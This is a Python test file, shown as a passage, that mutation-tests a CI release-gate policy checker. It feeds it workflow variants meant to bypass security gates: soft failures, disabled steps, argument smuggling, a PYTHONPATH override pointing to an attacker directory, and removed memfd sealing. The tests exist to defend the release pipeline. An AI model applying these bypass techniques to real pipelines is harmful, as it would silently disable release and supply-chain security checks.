#!/usr/bin/env python3
from __future__ import annotations

from collections.abc import Callable
import hashlib
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import check_ci_release_gate_policy as policy


def fixture(
    run: str,
    condition: str | None = None,
    continue_on_error: str | None = None,
) -> str:
    condition_line = "" if condition is None else f"        if: {condition}\n"
    continue_line = (
        ""
        if continue_on_error is None
        else f"        continue-on-error: {continue_on_error}\n"
    )
    indented = "\n".join(f"          {line}" for line in run.splitlines())
    return (
        "jobs:\n"
        "  release-build:\n"
        "    steps:\n"
        "      - name: Gate\n"
        f"{condition_line}"
        f"{continue_line}"
        "        run: |\n"
        f"{indented}\n"
    )


def expect_missing(workflow: str) -> None:
    try:
        policy.require_executable_command(
            "fixture",
            policy.workflow_steps(workflow, "release-build"),
            "scripts/security-audit.sh",
            ("--require-binary",),
        )
    except SystemExit:
        return
    raise SystemExit("non-executable workflow text unexpectedly satisfied the gate")


def replace_once(workflow: str, before: str, after: str) -> str:
    if workflow.count(before) != 1:
        raise SystemExit(f"mutation target must occur exactly once: {before!r}")
    return workflow.replace(before, after, 1)


def expect_workflow_rejected(
    name: str,
    checker: Callable[[Path], None],
    workflow: str,
) -> None:
    with tempfile.TemporaryDirectory() as temp_dir:
        workflow_path = Path(temp_dir) / "workflow.yml"
        workflow_path.write_text(workflow, encoding="utf-8")
        try:
            checker(workflow_path)
        except SystemExit:
            return
    raise SystemExit(f"{name}: workflow mutation unexpectedly passed")


def expect_policy_rejected(name: str, operation: Callable[[], None]) -> None:
    try:
        operation()
    except SystemExit:
        return
    raise SystemExit(f"{name}: policy mutation unexpectedly passed")


def check_app_transport_regression_controls() -> dict[str, int]:
    source = (ROOT / "scripts/check-app-no-ssh-e2e.sh").read_text(encoding="utf-8")
    policy.require_app_transport_regressions(source)
    positive = 1
    negative = 0
    for arguments in policy.APP_TRANSPORT_REGRESSION_COMMANDS:
        command = " ".join(arguments)
        target = command + "\n"
        # The existing logical-line parser accepts genuine shell continuations.
        policy.require_app_transport_regressions(
            replace_once(source, target, command.replace(" ", " \\\n  ", 1) + "\n")
        )
        positive += 1
        mutations = (
            ("deleted", ""),
            ("commented", "# " + command + "\n"),
            ("echo only", "echo " + command + "\n"),
            ("short circuit", "false && " + command + "\n"),
            ("ignored failure", command + " || true\n"),
            ("background", command + " &\n"),
            ("negated", "! " + command + "\n"),
            ("skipped", "if false; then\n" + command + "\nfi\n"),
            ("errexit disabled", "set +e\n" + command + "\n"),
            ("pipeline", command + " | cat\n"),
            ("subshell", "(" + command + ")\n"),
            ("help", command + " --help\n"),
            ("extra skip", command + " --skip transport\n"),
            ("substitution", ': "$(' + command + ')"\n'),
            ("heredoc text", "cat <<'UNEXECUTED'\n" + command + "\nUNEXECUTED\n"),
        )
        for label, replacement in mutations:
            expect_policy_rejected(
                "app transport " + label,
                lambda replacement=replacement: policy.require_app_transport_regressions(
                    replace_once(source, target, replacement)
                ),
            )
            negative += 1
    for label, mutation in (
        ("no errexit", replace_once(source, "set -euo pipefail", "set -uo pipefail")),
        ("early success", replace_once(source, "set -euo pipefail", "set -euo pipefail\nexit 0")),
        ("build before regressions", source.replace(
            "cargo test --locked -p wallet --test node_rpc\n",
            '"$ROOT/scripts/build_release_artifacts.sh" --manifest "$MANIFEST" >/dev/null\n'
            "cargo test --locked -p wallet --test node_rpc\n", 1)),
    ):
        expect_policy_rejected(
            "app transport " + label,
            lambda mutation=mutation: policy.require_app_transport_regressions(mutation),
        )
        negative += 1
    return {"positive_controls": positive, "negative_controls": negative,
            "required_commands": len(policy.APP_TRANSPORT_REGRESSION_COMMANDS)}


def check_windows_launcher_regression_controls(workflow: str) -> dict[str, int]:
    """Reach semantic checks using canonical fixtures with deliberately re-pinned hashes."""
    reader_test = (
        "ReleaseLauncherPolicyTests.test_bounded_reader_preserves_crlf_and_ctrl_z_bytes"
    )
    digest_test = (
        "ReleaseLauncherPolicyTests.test_crlf_helper_requires_its_raw_digest_not_normalized_lf"
    )
    command = (
        "python3 -B scripts/test_check_release_launcher_policy.py "
        f"{reader_test} {digest_test}"
    )
    step = (
        "      - name: Verify Windows raw-byte launcher hashing\n"
        "        shell: bash\n"
        "        run: |\n"
        f"          {command}\n\n"
    )
    build_step = (
        "      - name: Build attested release artifacts\n"
        "        shell: bash\n"
        "        run: ./scripts/build_release_artifacts.sh\n\n"
    )
    command_error = "build-windows raw-byte launcher hashing: executable command"
    context_error = "build-windows raw-byte launcher hashing:"
    cases = [
        (
            "step omission",
            replace_once(workflow, step, ""),
            "build-windows: must contain exactly 11 reviewed steps",
        ),
        (
            "post-build execution",
            replace_once(workflow, step + build_step, build_step + step),
            "build-windows launcher regression/build order:",
        ),
    ]
    for name, replacement in (
        ("reader test omission", command.replace(f"{reader_test} ", "")),
        ("digest test omission", command.replace(f" {digest_test}", "")),
        ("test substitution", command.replace(digest_test, "ReleaseLauncherPolicyTests.test_missing_policy_fails")),
        ("bytecode flag omission", command.replace(" -B", "")),
        ("soft failure", command + " || true"),
        ("echo substitution", "echo " + command),
    ):
        cases.append((name, replace_once(workflow, command, replacement), command_error))
    for name, replacement, expected in (
        ("conditional execution", "        if: false\n        shell: bash\n", command_error),
        ("continue on error", "        continue-on-error: true\n        shell: bash\n", "continue-on-error must be false"),
        ("shell substitution", "        shell: pwsh\n", context_error),
        ("directory override", "        working-directory: attacker\n        shell: bash\n", context_error),
        ("environment override", "        env: {PYTHONPATH: /tmp/attacker}\n        shell: bash\n", context_error),
    ):
        changed_step = replace_once(step, "        shell: bash\n", replacement)
        cases.append((name, replace_once(workflow, step, changed_step), expected))

    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        path = root / ".github/workflows/release.yml"
        path.parent.mkdir(parents=True)
        # Preserve the real source-authority check; copy its exact current inputs
        # into the fixture rather than mocking or weakening that check.
        for relative in (
            policy.SUCCESSOR_CHECKER_RELATIVE_PATH,
            policy.SUCCESSOR_REGISTRY_RELATIVE_PATH,
        ):
            target = root / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes((ROOT / relative).read_bytes())

        def check(source: str) -> None:
            path.write_text(source, encoding="utf-8")
            with patch.object(
                policy,
                "PINNED_RELEASE_WORKFLOW_SHA512",
                hashlib.sha512(source.encode("utf-8")).hexdigest(),
            ):
                policy.check_release_workflow(path)

        # A passing control proves that canonical path/source checks are not
        # rejecting every fixture before the new semantic checks can execute.
        check(workflow)
        for name, changed, expected in cases:
            try:
                check(changed)
            except SystemExit as error:
                if expected not in str(error):
                    raise SystemExit(
                        f"Windows launcher {name} rejected at the wrong gate: {error}"
                    ) from error
            else:
                raise SystemExit(f"Windows launcher {name} unexpectedly passed")
    return {"positive_controls": 1, "negative_controls": len(cases)}


def check_historical_native_review_controls() -> dict[str, int]:
    positive = 0
    negative = 0
    fetch = "git fetch --no-tags --depth=1 origin 4810888722e8c9a2440e31b139f8cb10b060acee"
    verify = "./scripts/verify_native_backend_review_package.sh --historical-release"
    for relative in (".github/workflows/release.yml", ".github/workflows/prepare-premainnet-release.yml"):
        source = (ROOT / relative).read_text(encoding="utf-8")
        policy.require_historical_native_review(policy.workflow_steps(source, "security-gates"))
        positive += 1
        changes = (
            (fetch, "true"),
            (fetch, "# " + fetch),
            (fetch, fetch.replace("--depth=1", "--depth=2")),
            (fetch, fetch.replace("4810888722e8c9a2440e31b139f8cb10b060acee", "HEAD")),
            (fetch, fetch + " || true"),
            (verify, "true"),
            (verify, verify.replace(" --historical-release", "")),
            (verify, verify + " --skip"),
            (verify, verify + " || true"),
            ("      - name: Fetch pinned historical native backend source\n", "      - name: Fetch pinned historical native backend source\n        if: false\n"),
            ("      - name: Historical native backend review package verification\n", "      - name: Historical native backend review package verification\n        working-directory: untrusted\n"),
            ("      - name: Fetch pinned historical native backend source\n", "      - name: Fetch pinned historical native backend source\n        continue-on-error: true\n"),
            ("      - name: Historical native backend review package verification\n", "      - name: Historical native backend review package verification\n        continue-on-error: true\n"),
            ("      - name: Historical native backend review package verification\n", "      - name: Historical native backend review package verification\n        if: false\n"),
        )
        for before, after in changes:
            mutated = replace_once(source, before, after)
            expect_policy_rejected("historical package command mutation", lambda: policy.require_historical_native_review(policy.workflow_steps(mutated, "security-gates")))
            negative += 1
        # Swapping only the commands retains valid syntax but reverses the required order.
        swapped = source.replace(fetch, "__FETCH_PLACEHOLDER__", 1).replace(verify, fetch, 1).replace("__FETCH_PLACEHOLDER__", verify, 1)
        expect_policy_rejected("historical source fetched after verification", lambda: policy.require_historical_native_review(policy.workflow_steps(swapped, "security-gates")))
        negative += 1
    return {"positive_controls": positive, "negative_controls": negative}


def main() -> None:
    check_historical_native_review_controls()
    check_app_transport_regression_controls()
    expect_missing(fixture("# ./scripts/security-audit.sh --require-binary"))
    expect_missing(fixture("echo ./scripts/security-audit.sh --require-binary"))
    expect_missing(
        fixture("./scripts/security-audit.sh --require-binary", condition="false")
    )
    expect_missing(fixture("false && ./scripts/security-audit.sh --require-binary"))
    expect_missing(fixture("./scripts/security-audit.sh --require-binary || true"))
    expect_missing(fixture("./scripts/security-audit.sh --require-binary; true"))
    expect_missing(fixture("./scripts/security-audit.sh --help # --require-binary"))
    expect_missing(fixture("./scripts/security-audit.sh --require-binary --help"))
    expect_missing(
        fixture("if true; then ./scripts/security-audit.sh --require-binary; fi")
    )
    expect_missing(
        fixture("./scripts/security-audit.sh --require-binary\ntrue")
    )
    expect_missing(
        fixture(
            "./scripts/security-audit.sh --require-binary",
            condition="${{ github.event_name == 'pull_request' }}",
        )
    )
    expect_missing(
        fixture(
            "./scripts/security-audit.sh --require-binary",
            continue_on_error="true",
        )
    )
    expect_missing(
        fixture(
            "./scripts/security-audit.sh --require-binary",
            continue_on_error="${{ github.event_name == 'pull_request' }}",
        )
    )

    steps = policy.workflow_steps(
        fixture(
            "set -euo pipefail\n"
            "./scripts/security-audit.sh \\\n"
            "  --require-binary"
        ),
        "release-build",
    )
    index = policy.require_executable_command(
        "fixture", steps, "scripts/security-audit.sh", ("--require-binary",)
    )
    if index != 0:
        raise SystemExit("valid executable workflow step was not identified")
    explicit_false_steps = policy.workflow_steps(
        fixture(
            "./scripts/security-audit.sh --require-binary",
            continue_on_error="false",
        ),
        "release-build",
    )
    policy.require_executable_command(
        "fixture explicit false",
        explicit_false_steps,
        "scripts/security-audit.sh",
        ("--require-binary",),
    )
    cargo_steps = policy.workflow_steps(
        fixture("cargo install cargo-audit --version 0.22.2 --locked"),
        "release-build",
    )
    policy.require_executable_command(
        "fixture cargo pin",
        cargo_steps,
        "cargo",
        ("install", "cargo-audit", "--version", "0.22.2", "--locked"),
    )
    python_steps = policy.workflow_steps(
        fixture("python3 -B scripts/example_gate.py --require-authorized"),
        "release-build",
    )
    policy.require_executable_command(
        "fixture python -B",
        python_steps,
        "scripts/example_gate.py",
        exact_argument_vectors=(("--require-authorized",),),
    )
    for unsafe_python in (
        "python3 -c 'raise SystemExit(0)' scripts/example_gate.py --require-authorized",
        "python3 -m scripts.example_gate --require-authorized",
        "python3 -B --help scripts/example_gate.py --require-authorized",
    ):
        unsafe_steps = policy.workflow_steps(fixture(unsafe_python), "release-build")
        try:
            policy.require_executable_command(
                "fixture unsafe python option",
                unsafe_steps,
                "scripts/example_gate.py",
                exact_argument_vectors=(("--require-authorized",),),
            )
        except SystemExit:
            pass
        else:
            raise SystemExit(
                f"unsafe interpreter option unexpectedly passed: {unsafe_python}"
            )
    for name, run, executable, exact_arguments in (
        (
            "formal-core partial-mode smuggling",
            "bash scripts/check_formal_core.sh checker",
            "scripts/check_formal_core.sh",
            ((), ("all",)),
        ),
        (
            "formal-crypto isolation-before-full smuggling",
            "bash scripts/check_formal_crypto.sh --isolation-only full",
            "scripts/check_formal_crypto.sh",
            (("full",),),
        ),
        (
            "formal-crypto extra full-mode argument",
            "bash scripts/check_formal_crypto.sh full --isolation-only",
            "scripts/check_formal_crypto.sh",
            (("full",),),
        ),
    ):
        exact_steps = policy.workflow_steps(fixture(run), "release-build")
        try:
            policy.require_executable_command(
                name,
                exact_steps,
                executable,
                exact_argument_vectors=exact_arguments,
            )
        except SystemExit:
            pass
        else:
            raise SystemExit(f"{name}: non-exact command unexpectedly passed")
    try:
        policy.require_step_order("fixture", 2, 1)
    except SystemExit:
        pass
    else:
        raise SystemExit("out-of-order workflow steps unexpectedly passed")

    ci_workflow = (ROOT / ".github/workflows/ci.yml").read_text(encoding="utf-8")
    policy.check_ci_workflow(ROOT / ".github/workflows/ci.yml")
    strict_binary_commands = (
        "python3 -I -B scripts/test_check_v011_crypto_consumer.py",
        "python3 -I -B scripts/materialize_v011_predecessor.py --reserve-bytes 4294967296",
        "./scripts/security-audit.sh --require-binary --binary-manifest "
        "target/release/hegemon-release-artifacts.json --node-bin target/release/hegemon-node "
        "--binary target/release/wallet --binary target/release/walletd --binary target/release/private-spend",
    )
    for command in strict_binary_commands:
        target = "        run: " + command + "\n"
        for label, replacement in (
            ("commented", "        run: echo disabled\n"),
            ("echo only", "        run: echo " + command + "\n"),
            ("soft failure", "        run: " + command + " || true\n"),
            ("conditional", "        if: false\n" + target),
            ("directory override", "        working-directory: attacker\n" + target),
            ("environment override", "        env: {PYTHONPATH: /tmp/attacker}\n" + target),
            ("extra argument", "        run: " + command + " --help\n"),
        ):
            expect_workflow_rejected(
                "strict release binary " + label,
                policy.check_ci_workflow,
                replace_once(ci_workflow, target, replacement),
            )
    audit = strict_binary_commands[2]
    for label, mutated in (
        ("diagnostic bypass", audit.replace("--require-binary", "--allow-unapproved-profile --require-binary")),
        ("manifest omission", audit.replace(" --binary-manifest target/release/hegemon-release-artifacts.json", "")),
        ("node omission", audit.replace(" --node-bin target/release/hegemon-node", "")),
        ("wallet omission", audit.replace(" --binary target/release/wallet ", " ")),
        ("walletd omission", audit.replace(" --binary target/release/walletd", "")),
        ("private-spend omission", audit.replace(" --binary target/release/private-spend", "")),
    ):
        expect_workflow_rejected(
            "strict release binary " + label,
            policy.check_ci_workflow,
            replace_once(ci_workflow, "        run: " + audit, "        run: " + mutated),
        )
    for command in strict_binary_commands[:2]:
        for option in (" -I", " -B"):
            expect_workflow_rejected(
                "strict release binary interpreter option omitted",
                policy.check_ci_workflow,
                replace_once(ci_workflow, command, command.replace(option, "", 1)),
            )
    controls_step = (
        "      - name: Check bounded successor receipt rejection controls\n"
        "        run: " + strict_binary_commands[0] + "\n\n"
    )
    predecessor_step = (
        "      - name: Restore authenticated v0.11 predecessor for strict binary qualification\n"
        "        run: " + strict_binary_commands[1] + "\n\n"
    )
    expect_workflow_rejected(
        "strict release binary preparation order",
        policy.check_ci_workflow,
        replace_once(ci_workflow, controls_step + predecessor_step, predecessor_step + controls_step),
    )
    ci_formal_crypto_timeout = (
        "  formal-crypto-sanity:\n"
        "    runs-on: ubuntu-latest\n"
        "    timeout-minutes: 90\n"
    )
    expect_workflow_rejected(
        "PR formal-crypto sanity 30-minute timeout regression",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            ci_formal_crypto_timeout,
            ci_formal_crypto_timeout.replace("timeout-minutes: 90", "timeout-minutes: 30"),
        ),
    )
    expect_workflow_rejected(
        "PR formal-crypto sanity missing timeout",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            ci_formal_crypto_timeout,
            ci_formal_crypto_timeout.replace("    timeout-minutes: 90\n", ""),
        ),
    )
    ci_formal_vectors_timeout = (
        "  formal-core-vectors:\n"
        "    runs-on: ubuntu-latest\n"
        "    timeout-minutes: 60\n"
    )
    expect_workflow_rejected(
        "PR formal-core vectors 30-minute timeout regression",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            ci_formal_vectors_timeout,
            ci_formal_vectors_timeout.replace("timeout-minutes: 60", "timeout-minutes: 30"),
        ),
    )
    expect_workflow_rejected(
        "PR formal-core vectors missing timeout",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            ci_formal_vectors_timeout,
            ci_formal_vectors_timeout.replace("    timeout-minutes: 60\n", ""),
        ),
    )
    ci_smz9_parser_step = (
        "      - name: SMZ9 parser/verifier refinement regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh transaction-circuit "
        "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser\n"
    )
    expect_workflow_rejected(
        "PR SMZ9 parser refinement removal",
        policy.check_ci_workflow,
        replace_once(ci_workflow, ci_smz9_parser_step, ""),
    )
    expect_workflow_rejected(
        "PR SMZ9 parser stale-SMZ8 substitution",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser",
            "smallwood_engine::tests::lean_generated_smz8_proof_wire_vectors_match_production_parser",
        ),
    )
    ci_source_security_report_step = (
        "      - name: SMZ9 source-security report exact regression\n"
        "        run: cargo run --locked -p transaction-circuit --example "
        "smallwood_poseidon2_v8_security_report -- --check "
        "docs/crypto/smallwood_poseidon2_v8_smz9_source_security_report.json\n"
    )
    expect_workflow_rejected(
        "PR SMZ9 source-security report exact regression removal",
        policy.check_ci_workflow,
        replace_once(ci_workflow, ci_source_security_report_step, ""),
    )
    ci_successor_policy_regression_step = (
        "      - name: Transaction-proof successor authorization regression\n"
        "        run: python3 -I -B "
        "scripts/test_check_transaction_proof_successor_authorization.py\n"
    )
    expect_workflow_rejected(
        "PR transaction-proof successor authorization regression removal",
        policy.check_ci_workflow,
        replace_once(ci_workflow, ci_successor_policy_regression_step, ""),
    )
    expect_workflow_rejected(
        "PR transaction-proof successor authorization loses isolated Python",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "python3 -I -B scripts/test_check_transaction_proof_successor_authorization.py",
            "python3 scripts/test_check_transaction_proof_successor_authorization.py",
        ),
    )
    ci_v8_pending_codec_step = (
        "      - name: V8 PendingAction private-codec conformance regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh hegemon-node "
        "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly\n"
    )
    expect_workflow_rejected(
        "PR V8 PendingAction private-codec regression removal",
        policy.check_ci_workflow,
        replace_once(ci_workflow, ci_v8_pending_codec_step, ""),
    )
    expect_workflow_rejected(
        "PR V8 PendingAction stale-V2 substitution",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly",
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v2_exactly",
        ),
    )
    expect_workflow_rejected(
        "PR aggregate job soft-fail",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "  release-build:\n    runs-on:",
            "  release-build:\n    continue-on-error: true\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "PR aggregate step soft-fail",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "      - name: Require release binaries and every release prerequisite\n",
            "      - name: Require release binaries and every release prerequisite\n"
            "        continue-on-error: true\n",
        ),
    )
    expect_workflow_rejected(
        "PR formal-core shard mode substitution",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "        run: bash scripts/check_formal_core.sh lean\n",
            "        run: bash scripts/check_formal_core.sh checker\n",
        ),
    )
    expect_workflow_rejected(
        "PR aggregate condition expansion",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "  formal-core:\n"
            "    runs-on: ubuntu-latest\n"
            "    if: ${{ always() }}\n",
            "  formal-core:\n"
            "    runs-on: ubuntu-latest\n"
            "    if: ${{ always() || true }}\n",
        ),
    )
    expect_workflow_rejected(
        "PR formal-core aggregate success-check removal",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            '          test "$POLICY_RESULT" = success\n',
            "          true\n",
        ),
    )
    expect_workflow_rejected(
        "PR core shard inventory shrink with comment",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            "          - wallet-base\n",
            "          # - wallet-base\n",
        ),
    )
    expect_workflow_rejected(
        "PR core shard dispatch substitution",
        policy.check_ci_workflow,
        replace_once(
            ci_workflow,
            '        run: ./scripts/check-core.sh "test-${{ matrix.shard }}"\n',
            "        run: ./scripts/check-core.sh test-base\n",
        ),
    )

    focused_formal_crypto_workflow = (
        ROOT / ".github/workflows/formal-crypto.yml"
    ).read_text(encoding="utf-8")
    policy.check_formal_crypto_workflow(
        ROOT / ".github/workflows/formal-crypto.yml"
    )
    standalone_formal_crypto_timeout = (
        "  formal-crypto-sanity:\n"
        "    runs-on: ubuntu-latest\n"
        "    timeout-minutes: 90\n"
    )
    expect_workflow_rejected(
        "focused formal-crypto sanity 30-minute timeout regression",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            standalone_formal_crypto_timeout,
            standalone_formal_crypto_timeout.replace(
                "timeout-minutes: 90", "timeout-minutes: 30"
            ),
        ),
    )
    expect_workflow_rejected(
        "focused formal-crypto sanity missing timeout",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            standalone_formal_crypto_timeout,
            standalone_formal_crypto_timeout.replace("    timeout-minutes: 90\n", ""),
        ),
    )
    for trigger_path in policy.FORMAL_CRYPTO_POSEIDON2_V8_TRIGGER_PATHS:
        trigger_line = f"      - '{trigger_path}'\n"
        push_without_trigger = focused_formal_crypto_workflow.replace(
            trigger_line, "", 1
        )
        expect_workflow_rejected(
            f"focused formal-crypto push trigger removal: {trigger_path}",
            policy.check_formal_crypto_workflow,
            push_without_trigger,
        )
        pull_prefix, pull_body = focused_formal_crypto_workflow.split(
            "  pull_request:\n", 1
        )
        pull_without_trigger = (
            pull_prefix
            + "  pull_request:\n"
            + pull_body.replace(trigger_line, "", 1)
        )
        expect_workflow_rejected(
            f"focused formal-crypto pull_request trigger removal: {trigger_path}",
            policy.check_formal_crypto_workflow,
            pull_without_trigger,
        )
    focused_smz9_parser_step = (
        "      - name: SMZ9 parser/verifier refinement regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh transaction-circuit "
        "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser\n"
    )
    expect_workflow_rejected(
        "focused formal-crypto SMZ9 parser refinement removal",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow, focused_smz9_parser_step, ""
        ),
    )
    expect_workflow_rejected(
        "focused formal-crypto SMZ9 stale-SMZ8 substitution",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser",
            "smallwood_engine::tests::lean_generated_smz8_proof_wire_vectors_match_production_parser",
        ),
    )
    focused_source_security_report_step = (
        "      - name: SMZ9 source-security report exact regression\n"
        "        run: cargo run --locked -p transaction-circuit --example "
        "smallwood_poseidon2_v8_security_report -- --check "
        "docs/crypto/smallwood_poseidon2_v8_smz9_source_security_report.json\n"
    )
    expect_workflow_rejected(
        "focused SMZ9 source-security report exact regression removal",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            focused_source_security_report_step,
            "",
        ),
    )
    focused_successor_policy_regression_step = (
        "      - name: Transaction-proof successor authorization regression\n"
        "        run: python3 -I -B "
        "scripts/test_check_transaction_proof_successor_authorization.py\n"
    )
    expect_workflow_rejected(
        "focused transaction-proof successor authorization regression removal",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            focused_successor_policy_regression_step,
            "",
        ),
    )
    focused_v8_pending_codec_step = (
        "      - name: V8 PendingAction private-codec conformance regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh hegemon-node "
        "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly\n"
    )
    expect_workflow_rejected(
        "focused formal-crypto V8 PendingAction private-codec removal",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow, focused_v8_pending_codec_step, ""
        ),
    )
    expect_workflow_rejected(
        "focused formal-crypto V8 PendingAction stale-V2 substitution",
        policy.check_formal_crypto_workflow,
        replace_once(
            focused_formal_crypto_workflow,
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly",
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v2_exactly",
        ),
    )

    release_workflow = (ROOT / ".github/workflows/release.yml").read_text(
        encoding="utf-8"
    )
    policy.require_commit_rooted_successor_authority(ROOT)
    with tempfile.TemporaryDirectory() as authority_temp_dir:
        authority_root = Path(authority_temp_dir)
        checker_path = authority_root / policy.SUCCESSOR_CHECKER_RELATIVE_PATH
        registry_path = authority_root / policy.SUCCESSOR_REGISTRY_RELATIVE_PATH
        checker_path.parent.mkdir(parents=True, exist_ok=True)
        checker_source = (
            ROOT / policy.SUCCESSOR_CHECKER_RELATIVE_PATH
        ).read_text(encoding="utf-8")
        registry_source = (
            ROOT / policy.SUCCESSOR_REGISTRY_RELATIVE_PATH
        ).read_text(encoding="utf-8")
        checker_path.write_text(checker_source, encoding="utf-8")
        registry_path.write_text(registry_source, encoding="utf-8")
        policy.require_commit_rooted_successor_authority(authority_root)
        checker_path.write_text(
            checker_source.replace(
                "AUTHORIZED_PROFILES: dict[str, AuthorizedProfile] = "
                "load_source_owned_registry()",
                "AUTHORIZED_PROFILES: dict[str, AuthorizedProfile] = {}",
                1,
            ),
            encoding="utf-8",
        )
        expect_policy_rejected(
            "release checker registry-load removal",
            lambda: policy.require_commit_rooted_successor_authority(authority_root),
        )
        checker_path.write_text(checker_source, encoding="utf-8")
        checker_path.write_text(
            checker_source.replace(
                "_, registry_payload = read_regular_file_beneath(",
                "_, registry_payload = unsafe_registry_path_read(",
                1,
            ),
            encoding="utf-8",
        )
        expect_policy_rejected(
            "release checker descriptor-bound registry-load removal",
            lambda: policy.require_commit_rooted_successor_authority(authority_root),
        )
        for name, marker, replacement in (
            (
                "release checker executable evidence inventory removal",
                "SOURCE_EXECUTABLE_RELEASE_EVIDENCE_IDS",
                "SELF_ATTESTED_RELEASE_EVIDENCE_IDS",
            ),
            (
                "release checker data-only registry AST parser removal",
                "registry_module = ast.parse(",
                "registry_module = unsafe_exec_parse(",
            ),
            (
                "release checker registry literal grammar removal",
                "def parse_registry_literal(",
                "def accept_registry_expression(",
            ),
            (
                "release checker source-bound evidence inventory removal",
                "SOURCE_BOUND_RELEASE_EVIDENCE_COMMANDS",
                "REPOSITORY_JSON_EVIDENCE_COMMANDS",
            ),
            (
                "release checker hermetic authority schema removal",
                "HERMETIC_RELEASE_AUTHORITY_SCHEMA",
                "UNBOUND_RELEASE_ENVIRONMENT_SCHEMA",
            ),
            (
                "release checker hermetic root inventory removal",
                "SOURCE_BOUND_HERMETIC_RELEASE_ROOTS",
                "ENVIRONMENT_SUPPLIED_RELEASE_ROOTS",
            ),
            (
                "release checker hermetic bootstrap inventory removal",
                "HERMETIC_RELEASE_REQUIRED_BOOTSTRAP_ROLES",
                "UNVERIFIED_BOOTSTRAP_ROLES",
            ),
            (
                "release checker hermetic command inventory removal",
                "HERMETIC_RELEASE_REQUIRED_COMMAND_ROLES",
                "PATH_LOOKUP_COMMAND_ROLES",
            ),
            (
                "release checker empty PATH requirement removal",
                '"PATH": ""',
                '"PATH": "/usr/bin"',
            ),
            (
                "release checker early hermetic authority gate removal",
                "if artifact_command_runner is run_artifact_verifier_command:",
                "if False:",
            ),
            (
                "release checker absent hermetic root rejection removal",
                "source-owned hermetic release root authority is absent",
                "untrusted release root accepted",
            ),
            (
                "release checker unprovisioned hermetic runtime rejection removal",
                "hermetic release runtime is not provisioned in this revision",
                "unprovisioned runtime accepted",
            ),
            (
                "release checker canonical evidence receipt parser removal",
                "SOURCE_COMMAND_RECEIPT_SCHEMA",
                "UNPARSED_COMMAND_STDOUT_SCHEMA",
            ),
            (
                "release checker evidence stdout binding removal",
                "source command output is not bound",
                "self asserted command output accepted",
            ),
            (
                "release checker frozen source-path inventory removal",
                "SOURCE_EVIDENCE_PATHS_BY_ID",
                "BUNDLE_SUPPLIED_SOURCE_PATHS",
            ),
            (
                "release checker canonical source-path comparison removal",
                "if declared_path != expected_path:",
                "if False:",
            ),
            (
                "release checker multi-root source closure removal",
                "RETAINED_SOURCE_INVENTORY_ROOT_PACKAGES",
                "PARTIAL_SOURCE_INVENTORY_ROOT_PACKAGES",
            ),
            (
                "release checker active excluded path-package loading removal",
                "load_excluded_local_package",
                "ignore_excluded_local_package",
            ),
            (
                "release checker inactive feature exclusion binding removal",
                "inactive_in_source_owned_default_feature_graph",
                "unreviewed_feature_exclusion",
            ),
            (
                "release checker clean revision requirement removal",
                "requires a clean tracked and untracked tree",
                "dirty release tree accepted",
            ),
            (
                "release checker command source revision guard removal",
                "source revision changed during execution",
                "source revision race accepted",
            ),
            (
                "release checker immutable verifier execution removal",
                "run_descriptor_bound_executable",
                "run_path_racy_executable",
            ),
            (
                "release checker non-Linux verifier rejection removal",
                "execution requires Linux sealed memfd authority",
                "portable external verifier execution accepted",
            ),
            (
                "release checker sealed memfd creation removal",
                "os.memfd_create(",
                "os.open(",
            ),
            (
                "release checker memfd sealing removal",
                "fcntl.F_ADD_SEALS",
                "fcntl.F_GET_SEALS",
            ),
            (
                "release checker memfd seal verification removal",
                "fcntl.F_GET_SEALS",
                "unverified_memfd_seals",
            ),
            (
                "release checker write seal removal",
                "fcntl.F_SEAL_WRITE",
                "0",
            ),
            (
                "release checker grow seal removal",
                "fcntl.F_SEAL_GROW",
                "0",
            ),
            (
                "release checker shrink seal removal",
                "fcntl.F_SEAL_SHRINK",
                "0",
            ),
            (
                "release checker seal-lock removal",
                "fcntl.F_SEAL_SEAL",
                "0",
            ),
            (
                "release checker proc descriptor execution removal",
                'execution_path = f"/proc/self/fd/{sealed_descriptor}"',
